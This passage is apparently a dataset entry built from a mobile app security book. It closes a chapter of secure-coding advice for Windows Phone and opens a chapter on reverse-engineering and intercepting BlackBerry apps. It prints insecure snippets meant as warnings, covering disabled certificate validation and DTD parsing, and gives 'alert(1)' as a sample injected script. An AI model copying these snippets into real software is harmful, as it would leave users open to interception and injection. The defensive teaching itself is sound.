SQLiteConnection(Path.Combine(ApplicationData.Current.\nLocalFolder.Path,\n\"test.db\"));\n[ ... ]\nSQLiteCommand cmd = db.CreateCommand(\"select * from Stock where Symbol = ?\",\nattackerInput);\n// get all stock items with name in question\nList<Stock> stockList = cmd.ExecuteQuery<Stock>();\nThe emboldened \"?\" character instructs the CreateCommand() API to include attackerInput as a parameter to\nthe query, and as such, any data in attackerInput will be correctly treated as data, rather than as part of the\nquery syntax itself.\nIn general, however, we recommend that you use a data model approach, instead of constructing raw SQL\nqueries if possible. Sqlite-net’s github README gives a simple example of how to do this at\nhttps://github.com/praeclarum/sqlite-net/blob/master/README.mdown. The example is also applicable to\nSQLCipher, given the deliberate similarity of its API to other SQLite layers.\nImplementing Secure Communications\nAs with any application that requires secure network communications, mobile apps should also use secure\ncommunications channels for their network-based interactions. This section offers guidelines for secure\nnetwork communications.\nUsing SSL/TLS\nUsing SSL/TLS for all network traffic that has the potential to contain sensitive information is now standard. In\ngeneral, though, we recommend using SSL/TLS for all network communications, because interference on non-\nsensitive communications can also end up having security consequences; consider as-of-yet unknown parsing\nvulnerabilities, or HTML/JavaScript injection that facilitates phishing attempts, for example.\nFor carrying out any kind of web-based interaction, we recommend using https:// URLs, as opposed to http://\nURLs, which result in traffic transmitted in unencrypted form.\nWhen apps use WebBrowser or WebView components, pages should be loaded via https://,\nwebBrowser.Navigate(new Uri(\"https://www.myapp.co.uk\", UriKind.Absolute));\nand never via http://, as in this insecure example:\nwebBrowser.Navigate(new Uri(\"http://www.myapp.co.uk\", UriKind.Absolute));\nThe same principles apply when making API requests using, for example, the WebRequest API; use SSL—as in,\nstring requestUri = \"https://www.myapp.co.uk/webapi/getPost= + postId;\nHttpWebRequest request =\n(HttpWebRequest)HttpWebRequest.Create(requestUri);\n[ ... ]\nrequest.BeginGetResponse(GetPostCallback, request);\nand not via the equivalent http:// URL.\nSSL connections should be used for network interactions that are not HTTP-based. The following MSDN\ndocumentation details how to enable SSL/TLS for connections being made via Windows.Networking.Sockets:\nhttp://msdn.microsoft.com/en-us/library/windows/apps/hh780595.aspx.\nAlthough it’s arguable that requests that do not deal with sensitive information do not need to be made via\nSSL/TLS sessions, data encryption is not the only security advantage of using encrypted tunnels. Use of\nSSL/TLS for non-sensitive communications should be encouraged because SSL/TLS guarantees the integrity of\ndata being sent and received, guarantees the identity of the remote peer, and can prevent unanticipated attacker\nvectors that could occur as a result of an attacker’s being able to inject into a non-SSL/TLS’d stream (that is,\nphishing attempts or exploiting a bug in a library being used by an app, either directly or indirectly).\nWe therefore recommend the use of SSL/TLS for all network communications made by mobile apps, especially\ngiven that using smartphones on untrusted networks such as open Wi-Fi networks in coffee shops, bars, and in\nhotels has become very common. Some standard cell phone protocols, such as General Packet Radio Service\n(GPRS), also have known problems relating to forcing phones to connect to an attacker-controlled base station\n(http://blog.mdsec .co.uk/2014/11/44con-2014-greedybts-hacking-adventures.html).\nSSL/TLS Certificate Validation\nIn general, the only sensible reason for disabling certificate validation in applications is that the application is in\ndevelopment, because many development environments do not have certificate authority (CA)-signed\ncertificates installed on their infrastructure. In production, generally no good reasons exist for having SSL/TLS\ncertificate validation disabled.\nIn Windows Phone 8, the HTTP APIs expose no documented way to disable certificate validity checks, thus\nensuring that certificate validation is enabled is not generally a concern in Windows Phone 8 apps.\nWindows Phone 8.1, however, does allow certificate validation to be turned off in Windows.Web.Http.HttpClient\nobjects, via use of an HttpBaseProtocolFilter object. Code like the following disables certificate validation:\nHttpBaseProtocolFilter filter = new HttpBaseProtocolFilter();\nfilter.IgnorableServerCertificateErrors.Add(ChainValidationResult.Untrusted);\nfilter.IgnorableServerCertificateErrors.Add(ChainValidationResult.Expired);\n[ ... ]\nvar httpClient = new Windows.Web.Http.HttpClient(filter);\nDevelopers preparing their applications for build and release should ensure that no HttpBaseProtocolFilter\nobject is being instantiated and used for disabling SSL/TLS certificate validation. Failure to ensure that\ncertificate validation is turned on in production builds may endanger the data of app users, thus adding such\nchecks to an engineer’s build checklist is highly encouraged.\nAvoiding Cross-Site Scripting in WebViews and WebBrowser Components\nIn Chapter 12, we discussed how injection attacks into WebBrowser and WebView components could have serious\nsecurity consequences. In particular, cross-site scripting attacks by suitably positioned attackers (that is,\nunencrypted Wi-Fi in coffee shops and hotels) could result in attacks such as cookie theft and phishing attacks.\nBecause guarding against these attacks is important for secure smartphone apps, we offer guidelines for\nminimizing the risk of cross-site scripting in WebBrowser and WebView components.\nUsing SSL/TLS for Network Communications\nWhen WebBrowser and WebView components fetch and render data via HTTP (and not HTTPS), the risk always\nexists of a suitably positioned attacker injecting data into the session. Such data could include JavaScript and\nHTML that sets up a phishing attempt, or JavaScript that attempts to steal a user’s session cookies could be\nintroduced. Injected HTML and JavaScript could also attempt to exploit parsing vulnerabilities in the HTML and\nJavaScript engines themselves.\nAs mentioned earlier in this chapter, using SSL/TLS sessions for all communications, whether traffic is deemed\nto be sensitive or not, is advisable.\nDisabling JavaScript\nIf a WebBrowser control does not specifically require JavaScript to provide the app’s functionality, not enabling it\nis advisable. WebBrowser components actually require JavaScript to be explicitly enabled for JavaScript to be\nexecuted in the first place.\nJavaScript may be enabled via the IsScriptEnabled property, either programmatically or in the appropriate\nXAML markup. The default is False, but copying and pasting code examples from sites such as StackOverflow\nmay result in some developers shipping apps that enable JavaScript without that particular intention.\nIf your app’s WebView or WebBrowser does not explicitly require JavaScript to be enabled, ensure that the app does\nnot contain the following (on a non–case-sensitive basis), in any XAML pages, or in its codebase:\nIsScriptEnabled=\"True\"\nSetting the IsScriptEnabled property to False explicitly for your WebBrowser instances may be advisable, if you\ndon’t need JavaScript, in case Microsoft changes the default to True in the future. JavaScript can be explicitly\ndisabled in the XAML page markup that the WebBrowser component is contained within, i.e.,\n<phone:WebBrowser Name=\"browser\"\nIsScriptEnabled=\"False\"\nScriptNotify=\"browser_ScriptNotify\"\nSource=\"https://www.myapp.com\"/>\nAlternatively, the setting can be set programmatically on the object in question:\nmyWebBrowser.IsScriptEnabled=\"False\"\nCurrently no documented way exists to disable JavaScript on a WebView object, so a developer who does not\nrequire the use of JavaScript may consider using WebBrowser in place of WebView.\nSafe Construction of Dynamic HTML and JavaScript\nSome apps may construct HTML and JavaScript dynamically, often using data that is influenced or controlled by\nan attacker. For example, consider the following code fragment:\nstring someHtml = \"<html><head><img src=\"attackerInfluencedValue\"></html>\";\n[ ... ]\nmyWebView.NavigateToString(someHtml);\nIn such situations, developers must ensure that attacker-influenced values being inserted into dynamically-\ngenerated HTML and JavaScript code is sanitized so that attackers cannot control the syntax of the resulting\ncode.\nTo prevent many cases of malicious content from being injected into HTML/JavaScript strings, use the\nHttpUtility.HtmlEncode() API:\nstring someHtml = \"<html><head><img src=\\\"\" +\nHttpUtility.HtmlEncode(attackerInfluencedValue) +\" \\\"></html>\";\nIn such cases, the attacker’s string would be unable to break out of the src=\"...\" parameter, thus preventing\nscripting injection attacks.\nDevelopers must also be careful in passing attacker-controlled values as JavaScript function parameters,\nhowever. Consider the following case:\nstring someHtml = \"<html><head><script>someFunction(\" +\nattackerControlledString + \")</script><html>\";\nIn this case, an attacker could, for example, pass alert(1) in as attackerControlledString, which would result\nin alert(1) being executed before control is passed to someFunction().\nTo prevent such cases, enclose the attacker-controlled value in double-quotes, and also escape it to prevent\nescape from the double quotes:\nstring someHtml = \"<html><head><script>someFunction(\\\"\" +\nHttpUtility.HtmlEncode(attackerControlledString) + \"\\\")</script><html>\";\nAvoiding Local Scripting Attacks\nIn the Chapter 11 we described how opening files in WebBrowser and WebView controls from the local filesystem\ncould result in the theft of files from the app’s sandbox. In particular, this is possible because the same-origin\npolicy allows access to documents that are from the same origin; in the context of a file loaded locally, this is the\nlocal filesystem.\nTherefore, avoiding the construction or offline saving of web pages for future loading from the filesystem is\nadvisable, unless you’re very careful in ensuring that their contents are safe.\nSecure XML Parsing\nIt’s well understood in the computer security industry that the main risks around XML parsing is the resolution\nof Document Type Definitions DTDs)—particularly DTDs that refer to external entities such as local files and\nother URLs. External entity attacks can result in theft of files from the filesystem and may allow internal web\nservices to be hit via URLs being resolved as external entities; both cases are obviously undesirable from a\nsecurity perspective. Expanding DTDs can also result in denial-of-service (DoS) attacks, often called the “billion\nlaughs” attack.\nAs we discussed in some detail in the Chapter 11 section, “Attacking XML Parsing”, the standard API for XML\nprocessing in Windows Phone apps is XDocument and associated classes.\nFortunately for the Windows Phone developer, XDocument objects do not parse DTDs by default, and as such, a\ndeveloper must manually set an attribute on the object to enable such parsing. This, however, is possibly more\ncommon than expected, given that developers often copy and paste code from community contribution sites\nsuch as StackOverflow.\nDevelopers and security testers should ensure that apps do not have code similar to the following, which\nenables DTD parsing:\nvar settings = new XmlReaderSettings { DtdProcessing = DtdProcessing.Parse };\nXmlReader xmlReader = XmlReader.Create(\"someFile.xml\", settings);\n// parse the XML file\nXDocument xmlDoc = XDocument.Load(xmlReader);\nClearing Web Cache and Web Cookies\nIf a device is compromised, an attacker may be able to gain access to cookies and the web cache that was\nacquired via the app’s web-based interactions. Compromising cookies may allow access to a user’s web session,\nand compromising the cache may result in disclosure of sensitive information to the would-be attacker.\nFrom a security perspective, clearing cookies and the web cache when they are no longer needed, such as when\nan app’s screen lock is enabled, or when the user logs out of the app or the web interface it’s talking to, is\ntherefore good practice. We’ll discuss here how you can do that.\nClearing Cookies\nRemove cookies from the device when they are no longer needed, because they may otherwise still be present in\nthe app’s INetCookies directory. The WebBrowser control allows cookies to be deleted using the\nClearCookiesAsync() API:\nawait new WebBrowser().ClearCookiesAsync();\nNote that the ClearCookiesAsync() API may simply be called on any WebBrowser component instantiated by the\napp, or statically, as in the previous code snippet.\nThere is also a way to delete cookies when WebView is being used:\nWindows.Web.Http.Filters.HttpBaseProtocolFilter myFilter = new\nWindows.Web.Http.Filters.HttpBaseProtocolFilter();\nvar cookieManager = myFilter.CookieManager;\nHttpCookieCollection myCookieJar = cookieManager.GetCookies(new\nUri(\"https://www.targeturi.com\"));\nforeach (HttpCookie cookie in myCookieJar)\n{\ncookieManager.DeleteCookie(cookie);\n}\nHere https://www.targeturi.com is the URL for which cookies are to be deleted.\nClearing Web Cache\nThe most full-proof way of ensuring that none of your application’s web interactions result in cache storage to\nits INetCache folder is to ensure that the web server being interacted with specifies appropriate non-caching\ndirectives in its HTTP(S) responses. For example, the following headers in HTTP(S) responses should be\nsufficient to prevent WebView, WebBrowser, WebRequest (and other such classes) from caching data from any\nresponses:\nCache-Control: no-store\nPragma: no-cache\nThe previous snippet represents our general advice for prevention of data caching.\nWhen applications use a WebBrowser control, you can programmatically delete that WebBrowser’s cache, using the\nClearInternetCacheAsync() API. Refer to the API’s MSDN documentation at the following URL:\nhttp://msdn.microsoft .com/library/windows/apps/jj571213(v=vs.105).aspx.\nUnfortunately, at the time of writing, there is no documented way to programmatically clear a cache put in place\nby use of a WebView. See the appropriate section at the following MSDN blog post:\nhttp://blogs.msdn.com/b/wsdevsol/archive/2014/04/03/ten-things-you-need-to-know-about-webview-\n_2d00_-an-update-for-windows-8.1.aspx#AN7.\nAvoiding Native Code Bugs\nBecause native code does not have the safety features of the Common Language Runtime (CLR) to protect it,\nWindows Phone applications written in native code (C, C++), or those calling into native modules, need to be\ncarefully written to avoid native code vulnerabilities.\nNative code components containing such vulnerabilities as memory corruption bugs (heap overflows, stack\noverflows, and so on), format string bugs, uninitialized variable use, and so on, may all fall prey to classic native\ncode attacks.\nDevelopers should therefore review their native codebases for dangerous API misuse and other insecure coding\npractices.\nWe recommend consulting the following resources for information on security coding guidelines for native code\ndevelopment, which are provided by CERT: C secure coding guidelines at\nhttps://www.securecoding.cert.org/confluence/display/seccode/CERT+C+Coding+Standard and C++ secure\ncoding guidelines at https://www.securecoding.cert.org/confluence/pages/viewpage.action?pageId=637.\nWe also recommend consulting Microsoft’s banned API list, which is offered as a C and C++ header file. You\nmay obtain the file directly via the following URL: http://download.microsoft.com/download/2/e/b/2ebac853-\n63b7-49b4-b66f-9fd85f37c0f5/banned.h.\nConsider inserting #include to place the file into your code for analysis purposes. The following resource\ndiscusses how to use banned.h to analyze whether your codebase is misusing potentially dangerous APIs:\nhttp://blogs.microsoft .com/cybertrust/2012/08/30/microsofts-free-security-tools-banned-h/.\nOtherwise, you can manually analyze your app’s usage of APIs listed in banned.h to ensure no API misuse could\nresult in classic native code vulnerabilities.\nUsing Exploit Mitigation Features\nAs we already discussed in Chapter 10 and Chapter 11, Windows Phone supports several exploit mitigation\nfeatures, including:\n/GS protections (stack cookies and other stack overflow protections such as variable reordering)\nNXCOMPAT (DEP)\nSafeSEH\n/DYNAMICBASE (ASLR)\nAs per Visual Studio’s default settings, all of these are enabled on native binaries built from Visual Studio, hence\nunless these settings have been changed, your application’s native components should have these. Having\nexploit mitigation features significantly reduces the ease with which native code vulnerabilities may be\nexploited in vulnerable apps. Enabling them on all native binaries that are part of your app is highly\nrecommended.\nMicrosoft released a useful tool named BinScope, available at http://www .microsoft.com/en-\ngb/download/details.aspx?id=11910, for the purpose of analyzing native binaries to ensure that the\nrecommended exploit mitigation technologies are enabled on the binary in question.\nWe recommend that developers run BinScope on all native binaries distributed as part of their applications. In\nany case, it appears that for Windows Phone 8.1 apps, Microsoft insists upon BinScope’s catalog of tests passing.\nSee the following resource for further details: http://msdn.microsoft.com/en-\nus/library/windowsphone/develop/dn629257.aspx#binscope.\nSummary\nIn this chapter, we’ve aimed to offer some key guidelines for implementing secure Windows Phone apps. We\nrecommend following the guidelines when trying to implement Windows Phone applications with security\nrequirements:\nEncrypt all sensitive data, whether stored in databases, or other file formats.\nFollow industry-standard cryptography practices, and preferably, use AES-256.\nApply sensible cryptography key management principles. For example, use PBKDF2, and enforce a\nreasonably strict password complexity policy.\nUse a secure random data source, when needed (i.e., RNGCryptoServiceProvider).\nAttempt to wipe keys and passwords from memory, via a best-effort approach, when they are no longer\nrequired.\nAvoid SQL injection in apps that use SQLite-derived databases.\nImplement secure network communications via SSL/TLS.\nTake care to avoid cross-site scripting and script injection bugs.\nEnsure that XML parsing doesn’t resolve DTDs, unless this functionality is specifically required by your app.\nTry to clear web cache and cookies when they’re no longer needed.\nApply native code secure coding guidelines to avoid traditional bugs such as buffer overflows.\nBuild your native modules with exploit mitigation features enabled.",
    "question": "What are the key security practices for writing secure Windows Phone applications?",
    "summary": "This chapter discusses important coding practices for writing secure Windows Phone applications. It emphasizes using AES-256 encryption, secure key management with PBKDF2, and avoiding vulnerabilities like SQL injection and cross-site scripting. Developers should also implement SSL/TLS for secure communications, sanitize dynamic HTML/JavaScript, and ensure proper handling of sensitive data in memory and storage."
  },
  {
    "start": 81,
    "end": 88,
    "text": "CHAPTER 14\nAnalyzing BlackBerry Applications\nBlackBerry was the dominant smartphone platform for business in the early to mid-2000s. Although its\ndominance has been in severe decline, you may still need to analyze applications for it at some time.\nThis chapter provides an introduction to the BlackBerry platforms, some of the security traits you need to be\naware of, and the tools required to get you into a position to analyze a BlackBerry application. We then discuss\nsome specific high-level analysis techniques for BlackBerry 10 apps. This material does not cover BlackBerry 10\nAdobe AIR–based apps because support for them is deprecated in 10.3.1. For BlackBerry Legacy we provide a\ncondensed overview of the platform and analysis techniques.\nFundamentally, recognizing that BlackBerry apps (both Legacy and 10) are on the whole developed using\ncommon technologies, such as Java, C/C++ (ELF), HTML5, and JavaScript is important, and as such\nunderstanding the platform-specific aspects and tooling is important because most if not all of the language-\nspecific issues carry over from other platforms that use similar technologies.\nUnderstanding BlackBerry Legacy\nBlackBerry Legacy is the platform that is 7.x and earlier. This platform was in the market during BlackBerry's\ndominant era in the SmartPhone market. Although it isn't the latest it does still continue to have strong\nrepresentation in certain subsectors and emerging markets. Due to this legacy coupled with representation in\ncertain high-security environments such as the government and financials services sectors, understanding how\nto access apps is important.\nArchitecture, Security, and the Simulator\nThe BlackBerry Legacy platform is based on a lightweight, custom, real-time operating system (the BlackBerry\noperating system, or BBOS) and Java Virtual Machine (JVM), which itself is custom although deemed\nSUN/Oracle compatible. The BBOS runs on the application processor (AP) and provides the abstraction layer\nbetween the JVM and the hardware.\nThe BlackBerry Legacy simulator is actually very close in terms of architecture and code to the JVM and BBOS\nthat run on the device. That is, the JVM is nearly identical and there are stubs for the BBOS APIs used by the\nJVM, which instead of translating to real hardware are instead translated to either simulator-specific or\nfunctionality corresponding to Microsoft Windows.\nThe notable differences between device and simulator are that although the device code is compiled for the\nARM CPU architecture, the simulator is compiled for the X86 CPU architecture. The simulator by virtue of its\npurpose also provides a number of simulated hardware devices (GPS, cellular network, and so on) and the\nability to do certain operations such as not enforcing certain security controls found on the device. This\nflexibility with these controls is very useful during development. However, these security controls cannot be\nsubverted on a real device, so verifying any vulnerability you discover in an app on a real device and not solely\nthe simulator is always worthwhile.\nThe security model of BlackBerry Legacy is entirely implemented within the JVM. All the high-level security\nconcepts such as app controls, encryption, private application storage mechanisms, code signing, and so on are\nimplemented there.\nApps and COD Files\nBlackBerry Legacy apps are at their core Java based; however, unlike its desktop cousin, its apps are not stored\nin JAR files but instead in COD files. These COD files are generated by a custom BlackBerry generator that takes\nthe compiled Java class files and converts them. The reason for this custom storage mechanism is not to\nobfuscate or otherwise frustrate but for performance and space optimization. BlackBerry discusses why it uses a\ncustom file structure in the patent behind the COD format:\nJava .class files may be archived (and optionally compressed) into a .jar file. However, .jar files are not\ndirectly interpretable by the Java VM, and the .class files must be extracted (and decompressed, if\napplicable) from the .jar file (and read into memory) in order for them to be linked, resolved, and\ninterpreted by the Java VM. Although .jar files comprising archived and compressed .class files are smaller\nthan the .class files themselves (and are therefore more suitable for transmission between communication\ndevices), storage space for the extracted (and decompressed, if applicable) .class files needs to be available\nin the environment where the application is to be executed, so that the Java VM may access the .class files.\nConsequently, a solution involving .jar files may not represent a savings in storage space.\n−https://www.google.com/patents/WO2004051468A1\nThe benefit of the COD format is that files produced using it can be linked without the need to decompress\nthem. Also, optimization (with the exception of Just-In-Time compilation) is done on the comparably cheap PC\nside during compilation and production of the COD files.\nHowever, note that not all CODs are optimized and converted Java classes. Confusingly, some may actually be\nzip files. This is why when analyzing BlackBerry Legacy apps that verifying the actual contents prior to starting\nthe analysis is important.\nAside from pure Java apps, BlackBerry also introduced WebWorks (HTML5 and JavaScript)–based apps.\nWebWorks apps have a COD name but are standard zip files.\nSo when you see a COD, remember it might be\nAn optimized Java class, which requires custom tooling to reverse engineer as discussed later in this chapter\nA zip file, which you can extract with common unzip utilities\nReverse Engineering COD Files\nIn this section we will review how to reverse-engineer the files that contain BlackBerry legacy apps. We will\nwalk through the process looking at the container types and the tools used to extract their contents.\nJava COD Files\nDue to the proprietary format used by non-zip format COD files, traditional Java class decompilation tools such\nas JAD won't work. Instead, two open source projects help in reverse engineering COD files:\ncod2jar (https://code.google.com/p/cod2jar/source/checkout)\ncoddec (http://dontstuffbeansupyournose.com/2009/02/19/disassembling- blackberry-apps-take-2/ and\nthe original at http://drbolsen.wordpress .com/2008/07/14/coddec-released/)\ncoddec was the first COD reverse engineering tool, originally developed by Dr. Bolsen and later updated by the\nDontStuffBeansUpYourNoes team. However, it can at times be a little fragile. cod2jar is a Python-based\napplication and tends to yield results on COD files created with newer versions of the BlackBerry SDK.\nKeep in mind that developers may try and obfuscate their code using tools such as ProGuard\n(http://proguard.sourceforge.net/), or otherwise modify their COD's file structure to break these tools.\nAfter the COD files you are interested in have been decompiled, you are then free to perform a code review as\nyou would any other Java applications.\nZip COD Files\nYou can rename zip-based COD files (where required; for example, typically in Microsoft Windows) and then\nextract them with common zip archive utilities such as 7zip on Microsoft Windows or unzip on Linux and\nsimilar.\nDepending on the purpose of the zip, for example, WebWorks versus a sibling COD, the contents will vary.\nJava Development Environment and JVM Interface\nThe Eclipse-based Java Development Environment (JDE) (http://developer\n.blackberry.com/bbos/java/download/JDE/) is used to develop Java apps for BlackBerry Legacy. The JDE\ncommunicates with the simulator and real device over the same JVM software interface. The simulator uses a\ntechnique to make itself appear connected to BlackBerry Desktop Manager so it doesn't need to implement a full\nUSB stack.\nThe JVM interface utilized by the JDE provides all the functionality that the JDE needs, including loading and\nexecuting CODs, reflection, and similar functionality.\nThe javaloader.exe utility, which ships with the JDE (http://btsc\n.webapps.blackberry.com/btsc/viewdocument.do?externalId=KB25526), also communicates with this same JVM\ninterface. The javaloader.exe utility provides functionality for listing those COD files that are installed and\ncopies them from the device to the PC, among other things. This and other functionality will be of interest to\nthose looking to analyze apps, as shown here:\nJavaLoader [-u] [-p[port]|[pin]] [-b[baud]] [-d0|-d1] [-w[password]] [-q]\n[command]\n-u Connect to USB handheld (default is serial)\n-p[port] Specifies the serial port (serial handhelds only)\n-p[pin] Specifies the handheld PIN (USB handhelds only; hex pin prefix '0x'\n)\n-b[baud] Specifies the baud rate (serial handhelds only)\n-d0 Disables VM debug mode\n-d1 Enables VM debug mode\n-w[password] Connects using the specified password\n-q Quiet mode\n[command] is one of\ndir [-d] [-s] [-1]\nLists modules on the handheld\n-d Display dependency information\n-s Display siblings\n-1 Single column output\ndeviceinfo\nProvides information on the handheld\nload [.cod file] ...\nLoads modules onto the handheld\nload [.jad file]\nLoad modules described by JAD onto the handheld\nload @[manifest] ...\nLoads all modules named in [manifest] onto the handheld\nsave { [module] ... | -g [group] }\nRetrieves modules from the handheld\n-g Retrieves all modules in a specified group\ninfo [-d] [-s] [-v] [.cod file] ...\nProvides information on the specified modules\n-d Display dependency information\n-s Display sibling information\n-v Display verbose module information\njavaloader.exe functionality to save the CODs is useful when an over-the-air (OTA) installation occurs, and you\nwant to obtain a copy to reverse engineer or load it into the simulator.\nApp Code Signing\nApp code signing on BlackBerry is not for identifying publishers by a human- distinguishable name but instead\nfor identifying the publisher to the JVM. Yes, it is true that there are a number of internal signing keys, which\nRIM uses to distinguish its own code and certain apps from third-party developers; however, third-party\ndevelopers use code signing to enforce certain platform security features only.\nFor example, when you use Protected Storage, access is based on code signing rather than anything else. It is no\nmore complex than that. If you are used to Microsoft Windows code-signing that includes details about the\noriginating organization, then keep in mind that, especially if you are analyzing malicious code, there won't be a\nclear indicator as to the originating organization.\nBlackBerry Mobile Data System\nBlackBerry Mobile Data System (MDS) is how a BlackBerry gets a connection to the Internet. It acts as a proxy\nbetween the device and the device's primary UDP transport and Internet services, which use UDP or TCP,\nrespectively.\nAn MDS acts as a proxy for higher-level protocols such as HTTP (and HTTPS when configured). When acting as\na proxy for these protocols, MDS also provides bandwidth-conserving functionality, including image\ncompression. Aside from higher-level protocols, MDS can also act as a UDP-to-TCP proxy.\nWhy is this architecture detail important? Most apps on BlackBerry interact with remote services via HTTP or\nHTTPS. BlackBerry doesn't have the concept of native HTTP or HTTPS proxies as we understand them on the\ndesktop i.e., a configuration option that apps will obey will doing HTTP or HTTPS requests. Thus, to intercept\nand observe or modify the traffic from these apps with tools such as BurpSuite, you chain a new HTTP proxy off\nof the MDS or MDS simulator.\nIn the MDS configuration you include something similar to the following to have the requests that come from\nthe device sent to localhost on port 1234:\napplication.handler.http.proxyEnabled=true\napplication.handler.http.proxyHost=localhost\napplication.handler.http.proxyPort=1234\nThe MDS Simulator comes into play when you use the device simulator because it is required to provide the\nconnectivity. You should configure and start the MDS simulator on your PC prior to launching the device\nsimulator.\nDevice Event Log\nThe BlackBerry device has a non-persistent rolling log that developers and the system may make use of. This log\nis worth checking during app analysis to see whether anything sensitive is revealed. To access the log, hold down\nthe ALT key and type lglg.\nUnderstanding BlackBerry 10\nBlackBerry 10 when compared to BlackBerry Legacy is a radical overhaul. Gone is the proprietary real-time\noperating system known as BBOS; it is instead replaced by the POSIX-compatible QNX operating system that\nBlackBerry acquired in April 2010. Gone, too, is the JVM (Java Virtual Machine); instead apps are produced\nusing a variety of technologies.\nThis section covers the BlackBerry 10 platform in some depth and the key technical aspects that enable you to\nunderstand the technology and be in a position to analyze the applications.\nThe BlackBerry 10 Platform\nBlackBerry 10 is based on the QNX POSIX (UNIX-like) –compatible micro kernel and associated OS-forming\nuserland components. Userland is a term which is used to describe the components of an operating system\nwhich exist outside of the kernel.\nWe won't provide a detailed primer to the QNX architecture. Numerous resources can provide a fundamental\noverview of QNX's design and implementation. If you are interested in these base concepts read the following:\nQNX Neutrino System Architecture—\n(http://support7.qnx.com/download/download/26183/QNX_Neutrino_RTOS_System_Architecture.pdf)\nSystem Architecture—(http://www.qnx.com/developers/docs/6.5.0SP1/neutrino/sys_arch/about.html)\nA Roadmap to QNX Software Development—\n(http://www.qnx.com/developers/docs/6.5.0SP1/momentics/bookset.html)\nQNX PPS Service (Persistent Publish/Subscribe)—(http://www.qnx\n.co.uk/developers/docs/6.5.0/index.jsp?topic=%2Fcom.qnx.doc .neutrino_pps%2Fpps.html)\nGoing beyond the core operating system and platform concepts, we will discuss some apps and higher-level\nconcepts:\nApps are packaged in BAR files and can be written using a variety of programming languages and associated\nframeworks. These are discussed in later sections.\nAuthman and Launcher are responsible for launching and enforcing capabilities when instructed to do so by\nthe graphical navigator.\nPPS Objects (implemented via the PPS service) are used to provide a range of data sources and access to\nperipherals such as Bluetooth and similar configurations.\nThe sections that follow dig into these concepts in more detail. But before doing so I want to acknowledge the\nwork of others who unlike me didn't get to spend years with QNX, PlayBook, and BlackBerry 10 and who instead\nconducted their own research that has contributed so much to the public understanding of the platform from a\nsecurity perspective:\nAndy Davis and Daniel Martin Gomez for their paper “BlackBerry PlayBook Security: Part One” —\nhttps://www.nccgroup.com/media/18436/blackberry_playbook_security._part_one.pdf\nAlex Plaskett for his presentation “An Introduction to Blackberry 10 Security (BB10 - QNX)” —\nhttps://labs.mwrinfosecurity.com/system/assets/410/original/mwri_blackberry-10-security_2013-06-\n03.pdf\nTim Brown for his general QNX research — http://seclists.org/fulldisclosure/2014/Mar/98\nRalf-Philipp Weinmann for his Blackhat presentation “BlackBerryOS 10 from a security perspective” —\nhttp://www.youtube.com/watch?v=z5qXhgqw5Gc\nZach Lanier and Ben Nell for their CanSecWest presentation “Deconstructing BB10” —\nhttps://cansecwest.com/slides/2014/NoApologyRequired-BB10-CanSecWest2014.pdf\nShivang Desa for his post “Get Started with Pentesting BlackBerry Apps” —\nhttp://blog.attify.com/attifys-guide-to-get-started-with- pentesting-blackberry-apps/\nThe BerryLeaks Wikia — http://berryleaks.wikia.com/wiki/BerryLeaks_Wiki\nAuthman and Launcher\nAuthman and Launcher were originally two software components developed for the BlackBerry PlayBook.\nLauncher is what actually executes the apps and authman is consulted as to the permissions they should be\nassigned. They were then used in BlackBerry 10 and have subsequently been used in the QNX CAR platform.\nTheir being used in the QNX CAR platform provides a handy public reference as to their purpose and\nfunctionality (http://www.qnx.com/developers/docs/qnxcar2/index.jsp?\ntopic=%2Fcom.qnx.doc.qnxcar2.hmi%2Ftopic%2Fhmi_authman.html).\nAuthman and Launcher are processes responsible for determining whether an app has permission to use a\nset of requested capabilities and for launching the app if it has sufficient permissions\n…\nTo launch an app, Navigator makes a request to Launcher. Launcher reads the app's manifest (MANIFEST.MF)\nfile and requests Authman to confirm that the app has permission to use the requested capabilities. Authman\nchecks these against the /etc/authman/sys.res file which lists the available system capabilities and the apps\nthat are entitled to use them.\nThis process is nearly identical on BlackBerry 10. The only real difference between BlackBerry 10 and QNX CAR\nin the context of Navigator, Launcher, and Authman is an awareness of BlackBerry Balance. As a result you can\nthink of these software components (Authman, Launcher and Navigator) as core security components to the app\nsecurity framework, ensuring apps run as the correct user with the correct capabilities and permissions.\nApps Packages and BAR Files\nBAR (BlackBerry Archive) format is simply a zip file with a well-defined structure. This well-defined structure\ndepends on the type of application whether native, Cascades, HTML5, JavaScript, or Android.\nFor native, Cascades, HTML5, and JavaScript this structure is:\n+\n|\n+-- META-INF\n|\n+-- native\nFor Android the structure is:\n+\n|\n+-- META-INF\n|\n+-- android\nThe META-INF directory contains a number of files containing metadata. This metadata varies but the common\nfiles are:\nMANIFEST.MF—Main manifest for the application\nAUTHOR.SF—Signature file for the developer's signing key containing SHA-512 hashes for the assets and parts\nof the manifest, which are protected\nAUTHOR.EC—Signature for AUTHOR.SF\nRDK.SF—Signature file for the BlackBerry signing key containing SHA-512 hashes for the assets and parts of\nthe manifest, which are protected\nRDF.EC—Signature for RDK.SF\nMANIFEST_[Language Code].BBR—Localization entry points\nThe MANIFEST.MF file is of the most interest and although BlackBerry doesn't publish a specification, the key\nattributes contained in the file are\nEntry-Point-User-Actions—The application's requested or required capabilities\n(http://www.qnx.com/developers/docs/qnxcar2/index .jsp?\ntopic=%2Fcom.qnx.doc.qnxcar2.hmi%2Ftopic%2Fhmi_authman.html)\nEntry-Point-System-Actions—The actions that the system will perform when launching the app; that is, that\nit will run native\nEntry-Point-Type—The type of app the values here include Qnx/Elf, Qnx/Cascades, Qnx/WebKit (for HTML5\nand JavaScript or WebWorks apps), Qnx/Uri (for URL shortcuts), and Qnx/Android\nEntry-Point — What the system will run when executing the program\nThe Entry-Point parameter can include a variety of possible values depending on the type of app. For example a\nnative app may look like this:\nEntry-Point: [timeout=10 flags=a path=(p600)boot]\nWhereas an Android app may look like this:\nEntry-Point: android://com.nccgroup?activity-name=com.nccgroup.activity.Hi\nFinally, an HTML5 and JavaScript app might look like this:\nEntry-Point: WEBWORKS_VERSION=1.0.4.11 app/native/wwe\nRecognizing that the ability to run arbitrary binaries or have libraries loaded by crafting your own manifest is\nnot considered a security issue is important. This is because all you would achieve is execution within the\ncontext of the user and groups that the app would be assigned anyway. Numerous other ways exist to get\narbitrary code execution on a device or simulator within a contained sandbox, including Developer mode;\ntherefore, the ability to run code or navigate the filesystem is not considered a security issue.\nWhat would be considered a security issue is if you are able to get code execution within the context of another\napp, gain access to the private data directory for another app, or modify its BAR contents, and still satisfy\nsignature checks.\nNative Applications\nNative applications (http://developer.blackberry.com/native/documentation/ core/) are those typically\nwritten in C or C++ via the Momentics IDE. The application code is compiled 